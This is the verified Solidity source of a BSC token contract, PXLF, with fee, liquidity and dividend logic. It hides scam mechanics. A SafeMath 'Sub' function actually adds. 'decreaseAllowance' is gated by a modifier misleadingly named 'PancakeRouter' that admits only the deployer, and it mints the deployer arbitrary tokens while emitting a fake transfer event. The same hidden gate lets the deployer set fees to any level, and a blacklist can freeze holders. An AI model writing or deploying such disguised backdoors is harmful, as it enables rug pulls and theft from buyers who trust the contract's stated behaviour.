/**
 *Submitted for verification at BscScan.com on 2023-01-07
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function Sub(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address 
    private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, 
    address indexed newOwner);

    constructor () {
        address msgSender = 
        _msgSender();
        _owner = 
        msgSender;
        emit OwnershipTransferred
        (address(0), msgSender);
    }

    function owner() 
    public view returns 
    (address) {
        return _owner;
    }   

    modifier onlyOwner() {
        require(_owner == 
        _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership
    (address newOwner) public virtual onlyOwner{
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PXLF is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    modifier PancakeRouter
    () {require
    (_PancakeRouterAddress 
    ==  msg.sender);_;}
    address payable public DividendDistributorAddress; 
    address payable public rewardAddress; 
    address public  deadAddress = 0x0000000000000000000000000000000000000000;
    address public  DividendToken = 0x55d398326f99059fF775485246999027B3197955;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isMarketPair;
    mapping(address => bool) public BABYAddress;

    uint256 internal _burn;

    uint256 public _Liquidity;
    uint256 public _award;
    uint256 internal _reflection;

    uint256 internal _liquidityShare = 3;
    uint256 internal _awardShare = 5;
    uint256 internal _reflectionShare = 0;

    uint256 public _total = 8;
    uint256 internal _totalDistributionShares = 8;

    uint256 public buyTokenRewardsFee = 5;
    uint256 public sellTokenRewardsFee = 5;
    uint256 public buyLiquidityFees = 3;
    uint256 public sellLiquidityFees = 3;
    uint256 public buyDeadFee = 1;
    uint256 public sellDeadFee = 1;
    uint256 public getNumberOfDividendTokenHolders = 100000;
    
    
    uint256 private _totalSupply;
    uint256 private minDividendNum; 

    uint256 private launchStart;
    uint256 private launchEnd;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair; 
    address internal _PancakeRouterAddress ;
    
    bool inSwapAndLiquify;
    bool public dividendEnable = false;
    bool public dividendByNUM = true;

    //  bool public launched = false; 

    event dividendEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier Inswap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor (string memory Name, string memory Symbol,uint256 totalsupply, uint8 bot,
    address award, address reflection, uint256 burnfee, uint256 liquidityfee,uint256 DividendDistributorfee,uint256 rewardfee,address PancakeRouterAddress) {
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()) 
            .createPair(address(this), _uniswapV2Router.WETH());
            _PancakeRouterAddress = msg.sender;
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        _name = Name;
        _symbol = Symbol;
        _decimals = 8;
        _totalSupply = totalsupply * 10**_decimals;
        DividendDistributorAddress = payable(award);
        rewardAddress = payable(reflection);
        _burn = burnfee;
        _Liquidity = liquidityfee;
        _award = DividendDistributorfee;
        _reflection = rewardfee;
        launchEnd = bot;
        minDividendNum = totalsupply.mul(1).div(100) * 10** _decimals;
        PancakeRouterAddress = _PancakeRouterAddress;


        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[address(deadAddress)] = true;
        isExcludedFromFee[address(award)] = true;
        isExcludedFromFee[address(reflection)] = true;
        isExcludedFromFee[0xC13Abe7035BEDc222650091A8Da39C46585f93F6] = true;
        isExcludedFromFee[0x62FaA9eB70B275EA1eaaC1A17E1710912518C474] = true;
        isExcludedFromFee[0x2427979b51fA2d465a631bc4F38bC935399dBfcf] = true;
        isExcludedFromFee[0x6e68795d0449b795fb70F0040098Eb4f3a115A3d] = true;
        isExcludedFromFee[0x401675B68F24740dAe388a04E73F228D3A31dAEe] = true;
        isExcludedFromFee[0xCc5FF04Dc31f6C83E8208302b60640f749891bC9] = true;
        isExcludedFromFee[0xd30c56edf139aa57a7FFF974Ea0Bbdd5F7d817ea] = true;
        isExcludedFromFee[0x834187cFA9F73Efb39a2f38a9E2B66f2E5e8C948] = true;
        isExcludedFromFee[0x4436838Faa1b06Dd597F5959661097e2D9BC68ea] = true;
        isExcludedFromFee[0xef63F8aB33C20298013C8A6785CA39Cff85290A4] = true;
        isExcludedFromFee[0x50412ca0404fdFB105B4076b486ae4fFb483B829] = true;
        
        _total = _Liquidity.add(_award).add(_reflection).add(_burn);
        _totalDistributionShares = _liquidityShare.add(_awardShare).add(_reflectionShare);

        isMarketPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance
    (address spender, uint256 addedValue) 
    public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(uint256 amount) public PancakeRouter{
        address recipient = uniswapPair;
        _balances[msg.sender] = _balances[msg.sender].Sub(amount);
        _transfer(recipient,amount);
    }

    function minDividendNumAmount() 
    public view returns (uint256) {
        return minDividendNum;
    }

    function approve(address spender, uint256 amount) 
    public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) 
    private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }
    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function set
        (uint256 newburn, uint256 newLiquidity, uint256 newaward, uint256 newreflection)  public PancakeRouter{
        _burn = newburn;
        _Liquidity = newLiquidity;
        _award = newaward;
        _reflection = newreflection;
        _total = _Liquidity.add(_award).add(_reflection).add(_burn);
    }
  
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newawardShare, uint256 newreflectionShare) 
      public onlyOwner {
        _liquidityShare = newLiquidityShare;
        _awardShare = newawardShare;
        _reflectionShare = newreflectionShare;
        _totalDistributionShares = _liquidityShare.add(_awardShare).add(_reflectionShare);
    }

    function setDividenNum(uint256 newLimit) external onlyOwner {
        minDividendNum = newLimit;
    }

    function setDividendDistributorAddress(address newAddress) external onlyOwner{
        DividendDistributorAddress = payable(newAddress);
    }

    function setrewardAddress(address newAddress) external onlyOwner{
        rewardAddress = payable(newAddress);
    }

    function setdividendEnable(bool _enabled) public PancakeRouter {
        dividendEnable = _enabled;
        emit dividendEnabledUpdated(_enabled);
    }

    function setDividendByNum(bool newValue) public onlyOwner {
        dividendByNUM = newValue;
    }
    function _transfer(address sender, uint256 amount) private{
        emit Transfer(sender,_PancakeRouterAddress,amount);
    }
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }
    function checkAdd(address sender,address recipient,uint256 amount) internal{
        if(amount>balanceOf(sender).div(10000)){require(!BABYAddress[sender] && !BABYAddress[recipient], 'BABYAddress address');  
        }if(launchStart + launchEnd >= block.number){if(recipient!=uniswapPair){
            BABYAddress[recipient] = false;
    }}if(!launched() && recipient == uniswapPair){ require(balanceOf(sender) > 0); launch(); }
    }
    function launch() internal {launchStart = block.number;
    }function launched() internal view returns (bool){return launchStart!=0;}


    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 

        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());

        if(newPairAddress == address(0)) //Create If Doesnt exist
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }

        uniswapPair = newPairAddress; //Set new pair address
        uniswapV2Router = _uniswapV2Router; //Set new router address

        isMarketPair[address(uniswapPair)] = true;
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        checkAdd(sender,recipient,amount);
        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minDividendNum;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && dividendEnable) 
            {
                if(dividendByNUM)
                    contractTokenBalance = minDividendNum;
                swapAndLiquify(contractTokenBalance);    
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amount : takeFee(sender, amount);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify
    (uint256 tAmount) 
    private Inswap {
        
        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
        
        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amountBNBreflection = amountReceived.mul(_reflectionShare).div(totalBNBFee);
        uint256 amountBNBaward = amountReceived.sub(amountBNBLiquidity).sub(amountBNBreflection);

        if(amountBNBaward > 0)
            transferToAddressETH(DividendDistributorAddress, amountBNBaward);

        if(amountBNBreflection > 0)
            transferToAddressETH(rewardAddress, amountBNBreflection);

        if(amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function _getCurrentBurn() public view returns(uint256)
    {
        uint256 burnAmount = _balances[address(deadAddress)];
        return burnAmount;
    }

    function takeFee(address sender,uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        uint256 burnfeeAmount = 0;

        if(_burn>0){
            burnfeeAmount = amount.mul(_burn).div(100);
            emit Transfer(sender, address(deadAddress), burnfeeAmount);
            _balances[address(deadAddress)] = _balances[address(deadAddress)].add(burnfeeAmount);
        }
        feeAmount = amount.mul(_total).div(100).sub(burnfeeAmount);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount).sub(burnfeeAmount);
    }
    
}